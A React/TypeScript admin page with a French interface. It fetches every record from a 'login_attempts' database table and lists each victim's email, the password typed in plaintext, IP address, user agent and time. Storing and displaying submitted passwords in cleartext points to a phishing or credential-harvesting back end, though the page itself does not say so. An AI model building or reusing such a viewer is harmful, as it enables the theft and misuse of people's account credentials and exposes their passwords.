
import React, { useState, useEffect } from 'react';
import { supabase } from '@/integrations/supabase/client';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import AdminAuth from '@/components/AdminAuth';

interface LoginAttempt {
  id: string;
  email: string;
  password_attempt: string;
  ip_address: string | null;
  user_agent: string | null;
  attempted_at: string;
}

const Admin = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    if (isAuthenticated) {
      fetchLoginAttempts();
    }
  }, [isAuthenticated]);

  const fetchLoginAttempts = async () => {
    try {
      setLoading(true);
      const { data, error } = await supabase
        .from('login_attempts')
        .select('*')
        .order('attempted_at', { ascending: false });

      if (error) {
        console.error('Error fetching login attempts:', error);
        alert('Erreur lors du chargement des données: ' + error.message);
      } else {
        setLoginAttempts(data || []);
        console.log('Loaded login attempts:', data?.length);
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Erreur lors de la connexion à la base de données');
    } finally {
      setLoading(false);
    }
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString('fr-FR');
  };

  const handleAuthenticated = () => {
    setIsAuthenticated(true);
  };

  if (!isAuthenticated) {
    return <AdminAuth onAuthenticated={handleAuthenticated} />;
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-lg">Chargement...</div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 p-8">
      <div className="max-w-7xl mx-auto">
        <div className="bg-white rounded-lg shadow-sm p-6">
          <div className="flex justify-between items-center mb-6">
            <h1 className="text-2xl font-bold text-gray-900">
              Tentatives de Connexion
            </h1>
            <div className="flex gap-2">
              <button
                onClick={fetchLoginAttempts}
                className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors"
              >
                🔄 Rafraîchir
              </button>
              <button
                onClick={() => setIsAuthenticated(false)}
                className="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700 transition-colors"
              >
                Déconnexion
              </button>
            </div>
          </div>
          
          <div className="mb-4 text-sm text-gray-600">
            Total des tentatives: {loginAttempts.length}
          </div>

          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Email</TableHead>
                  <TableHead>Mot de passe</TableHead>
                  <TableHead>Adresse IP</TableHead>
                  <TableHead>User Agent</TableHead>
                  <TableHead>Date & Heure</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {loginAttempts.map((attempt) => (
                  <TableRow key={attempt.id}>
                    <TableCell className="font-medium">
                      {attempt.email}
                    </TableCell>
                    <TableCell className="font-mono text-sm">
                      {attempt.password_attempt}
                    </TableCell>
                    <TableCell>
                      {attempt.ip_address || 'N/A'}
                    </TableCell>
                    <TableCell className="max-w-xs truncate">
                      {attempt.user_agent || 'N/A'}
                    </TableCell>
                    <TableCell>
                      {formatDate(attempt.attempted_at)}
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </div>

          {loginAttempts.length === 0 && (
            <div className="text-center py-8 text-gray-500">
              Aucune tentative de connexion enregistrée
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default Admin;
